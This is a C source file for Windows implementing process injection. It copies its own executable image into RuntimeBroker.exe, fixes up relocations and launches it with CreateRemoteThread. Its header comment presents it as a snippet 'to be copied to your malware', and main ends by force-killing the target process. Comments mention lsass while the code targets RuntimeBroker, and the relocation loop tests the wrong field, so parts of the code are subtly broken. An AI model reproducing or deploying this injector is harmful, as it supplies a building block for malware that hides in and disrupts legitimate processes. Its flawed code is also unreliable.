#define _CRT_SECURE_NO_WARNINGS
///
///This code snippet is to be copied to your malware. it will inject the malware into the specified process
/// 

#include<Windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<String.h>
//Globals and consts
#define INJECTED_PROCESS_COMMAND "Tasklist | findstr RuntimeBroker.exe"
#define PAYLOAD_TIME 10
//This is the function that will be the entry of the run in thr remote process
//The run of the malicious code will start from here
int InjectionEntryPoint()
{
	wchar_t Buffer[300] = { NULL };
	GetModuleFileName(GetModuleHandle(NULL), Buffer, 300);
	while(TRUE)
	{
		
		MessageBox(NULL, L"This is the code from the injection entry point!!", Buffer, 0);
	}
	return 0;

}


typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


DWORD GetProcessPid(char ProcessName[])
{
	char* Buffer = (char*)calloc(2048, sizeof(char));
	char* FinalOutput = (char*)calloc(100000, sizeof(char));
	//Checking if the memory is allocated
	if (Buffer && FinalOutput == NULL)
	{
		printf("Error allocating memory(%d)", GetLastError());
	}


	FILE* FileHandler;
	FileHandler = _popen(ProcessName, "r");
	while (fgets(Buffer, 2048, FileHandler) != NULL)
	{
		strcat(FinalOutput, Buffer);
	}


	fclose(FileHandler);
	//getting the output of cmd command "tasklist | findstr lsass.exe"
	//the output is some data of the lsass process

	//Parsing the data 
	char* ProcessId = strtok(FinalOutput, " ");

	//taking the first token which is the pid
	ProcessId = strtok(NULL, " ");

	//converting it to int
	int IntProcessId;
	sscanf(ProcessId, "%d", &IntProcessId);

	free(Buffer);
	free(FinalOutput);
	//returning lsass's pid
	return (DWORD)IntProcessId;
}

int ProcessInjection(DWORD Pid)
{



	//The current exe image base addr. the first header in the exe is the DOS-HEADER.
	//Any addr in the exe is relative to the image base (RVA).
	PVOID CurrentImage = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)CurrentImage;




	//Inside the DOS-HEADER the e_lfanew field contains 
	//the addr of the next hedaer, the NT-HEADER
	//in order to get the actual address of NTHEDAER and not just the rva the
	//addres will be the sum of the image base and the elfnaw
	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)CurrentImage + DosHeader->e_lfanew);


	// Allocating a new memory block that will contain the while PE image
	PVOID MainImage = VirtualAlloc(
		NULL,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT,
		PAGE_READWRITE);


	//copying the curent PE image to a temp memory block
	memcpy(MainImage,
		CurrentImage,
		NtHeader->OptionalHeader.SizeOfImage);

	//Openning the remote process prior to the process identifier extracted from tasklist
	HANDLE RemoteInjectedProcess = OpenProcess(
		MAXIMUM_ALLOWED,
		FALSE,
		(DWORD)Pid);


	// Allocating a new memory block on the target process
	PVOID targetImage = VirtualAllocEx(
		RemoteInjectedProcess,
		NULL,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	//because of the fact that the process will be loaded into a new image,
	//it's image base addr might be changed but the other addreses in the relocation
	//table remain the same so we must change the values in the reloc table prior the 
	//change in the image base addrs
	//now ill edit the copy of the image relocation table so that the new 
	//process will be able to resolve the adresses currectly
	DWORD_PTR DifferenceBetweenImages = (DWORD_PTR)targetImage - (DWORD_PTR)CurrentImage;



	PDWORD_PTR PatchedAddresses;

	PBASE_RELOCATION_ENTRY RelocTableRelativeAddress = 0;



	//getting to the relocation table of the
	//memory copy by adding the base image with the 
	//RVA of nthedaer=>optionalheader=>DataDirectories=>virtual address
	PIMAGE_BASE_RELOCATION RelocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)MainImage + NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	//will be used in the inner loop in order to iterate each relocation entry
	DWORD RelocEntriesCounter = 0;



	while (RelocTable->SizeOfBlock > 0)
	{
		//the number of entries is calculating by getting to the relocation's table block,
		// the block size that contains the size of the image base relocation.
		//by substracting the image base relocation size well get the size only 
		//of the block. each block contains 2 bytes, 1 for address and 1 for type
		RelocEntriesCounter = (RelocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / (sizeof(int) / 2);
		//proceeding blocks
		RelocTableRelativeAddress = (PBASE_RELOCATION_ENTRY)(RelocTable + 1);

		for (short i = 0; i < RelocEntriesCounter; i++)
		{
			if (RelocTableRelativeAddress[i].Offset == 1)
			{
				PatchedAddresses = (PDWORD_PTR)((DWORD_PTR)MainImage + RelocTable->VirtualAddress + RelocTableRelativeAddress[i].Offset);
				*PatchedAddresses += DifferenceBetweenImages;
			}
		}
		RelocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)RelocTable + RelocTable->SizeOfBlock);
	}

	// Write the relocated localImage into the target process
	WriteProcessMemory(
		RemoteInjectedProcess,
		targetImage,
		MainImage,
		NtHeader->OptionalHeader.SizeOfImage,
		NULL);

	// Start the injected PE inside the target process
	CreateRemoteThread(
		RemoteInjectedProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + DifferenceBetweenImages),
		NULL,
		0,
		NULL);

	return 0;
}





int main()
{
	ProcessInjection(GetProcessPid(INJECTED_PROCESS_COMMAND));
	Sleep(1000*PAYLOAD_TIME);
	system("Taskkill /F /IM RuntimeBroker.exe");
	return 0;
	
}







